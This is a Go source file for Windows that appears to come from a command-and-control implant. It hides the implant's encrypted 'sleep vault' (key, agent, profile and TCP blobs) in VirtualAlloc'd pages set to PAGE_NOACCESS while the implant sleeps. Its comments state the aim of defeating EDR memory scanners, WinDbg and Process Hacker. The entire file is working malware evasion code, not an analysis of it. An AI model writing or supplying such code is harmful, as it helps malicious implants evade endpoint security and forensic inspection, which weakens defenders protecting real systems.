//go:build windows

package main

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// guardedPages tracks a VirtualAlloc'd memory region used to protect vault
// data during sleep with PAGE_NOACCESS. This prevents EDR memory scanners,
// WinDbg, and Process Hacker from reading the encrypted vault — even if
// they know the address, ReadProcessMemory returns STATUS_ACCESS_VIOLATION.
type guardedPages struct {
	addr uintptr
	size uintptr
	// Offsets and lengths for reconstructing vault data on wake
	keyLen     int
	agentOff   int
	agentLen   int
	profileOff int
	profileLen int
	tcpOff     int
	tcpLen     int
}

// guardSleepPages moves vault data from Go heap to VirtualAlloc'd memory
// and sets pages to PAGE_NOACCESS. The Go heap copies are zeroed.
// Returns nil if vault is nil or allocation fails (non-fatal).
func guardSleepPages(vault *sleepVault) *guardedPages {
	if vault == nil || vault.key == nil {
		return nil
	}

	// Calculate total size: key + all blobs
	totalSize := len(vault.key)
	g := &guardedPages{keyLen: len(vault.key)}

	g.agentOff = totalSize
	g.agentLen = len(vault.agentBlob)
	totalSize += g.agentLen

	g.profileOff = totalSize
	g.profileLen = len(vault.profileBlob)
	totalSize += g.profileLen

	g.tcpOff = totalSize
	g.tcpLen = len(vault.tcpBlob)
	totalSize += g.tcpLen

	if totalSize == 0 {
		return nil
	}

	// Round up to page boundary (4096)
	allocSize := uintptr((totalSize + 4095) &^ 4095)

	// Allocate dedicated pages outside Go heap
	addr, err := windows.VirtualAlloc(0, allocSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return nil
	}
	g.addr = addr
	g.size = allocSize

	// Copy vault data to allocated pages
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), totalSize)
	copy(dst[0:], vault.key)
	if g.agentLen > 0 {
		copy(dst[g.agentOff:], vault.agentBlob)
	}
	if g.profileLen > 0 {
		copy(dst[g.profileOff:], vault.profileBlob)
	}
	if g.tcpLen > 0 {
		copy(dst[g.tcpOff:], vault.tcpBlob)
	}

	// Zero Go heap copies
	zeroBytes(vault.key)
	zeroBytes(vault.agentBlob)
	zeroBytes(vault.profileBlob)
	zeroBytes(vault.tcpBlob)
	vault.key = nil
	vault.agentBlob = nil
	vault.profileBlob = nil
	vault.tcpBlob = nil

	// Set pages to PAGE_NOACCESS — memory scanners get access violation
	var oldProtect uint32
	windows.VirtualProtect(addr, allocSize, windows.PAGE_NOACCESS, &oldProtect)

	return g
}

// unguardSleepPages restores vault data from PAGE_NOACCESS pages back to
// Go heap slices, then zeros and frees the guarded pages.
func unguardSleepPages(guard *guardedPages, vault *sleepVault) {
	if guard == nil || vault == nil {
		return
	}

	// Restore to PAGE_READWRITE so we can read the data
	var oldProtect uint32
	windows.VirtualProtect(guard.addr, guard.size, windows.PAGE_READWRITE, &oldProtect)

	// Calculate total used size
	totalUsed := guard.tcpOff + guard.tcpLen
	if totalUsed == 0 {
		totalUsed = guard.profileOff + guard.profileLen
	}
	if totalUsed == 0 {
		totalUsed = guard.agentOff + guard.agentLen
	}
	if totalUsed == 0 {
		totalUsed = guard.keyLen
	}
	src := unsafe.Slice((*byte)(unsafe.Pointer(guard.addr)), totalUsed)

	// Reconstruct vault slices from guarded memory
	vault.key = make([]byte, guard.keyLen)
	copy(vault.key, src[0:guard.keyLen])

	if guard.agentLen > 0 {
		vault.agentBlob = make([]byte, guard.agentLen)
		copy(vault.agentBlob, src[guard.agentOff:guard.agentOff+guard.agentLen])
	}
	if guard.profileLen > 0 {
		vault.profileBlob = make([]byte, guard.profileLen)
		copy(vault.profileBlob, src[guard.profileOff:guard.profileOff+guard.profileLen])
	}
	if guard.tcpLen > 0 {
		vault.tcpBlob = make([]byte, guard.tcpLen)
		copy(vault.tcpBlob, src[guard.tcpOff:guard.tcpOff+guard.tcpLen])
	}

	// Zero guarded pages before freeing
	allPages := unsafe.Slice((*byte)(unsafe.Pointer(guard.addr)), guard.size)
	for i := range allPages {
		allPages[i] = 0
	}
	windows.VirtualFree(guard.addr, 0, windows.MEM_RELEASE)
}
